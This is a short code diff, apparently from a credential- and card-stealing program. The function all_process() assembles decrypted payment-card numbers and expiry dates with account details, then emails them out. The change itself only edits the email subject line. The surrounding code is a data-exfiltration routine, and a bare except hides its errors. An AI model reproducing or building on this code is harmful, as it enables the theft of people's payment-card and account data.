@@ -311,7 +311,7 @@ def all_process():
                 tmp_account += "CARD EXPIRE YEAR       : " + str(card.expire_year) + "\r\n"
                 tmp_account += "CARD NO                : " + str(card.number_decrpyt.decode('utf-8', errors="ignore")) +"\r\n\r\n"
         #
-        return send_email("ACCOUNT(S) AND CARD(S) INFO(S)", tmp_account)
+        return send_email("ACCOUNT(S) AND CARD(S) INFO", tmp_account)
     except:
         return False
 
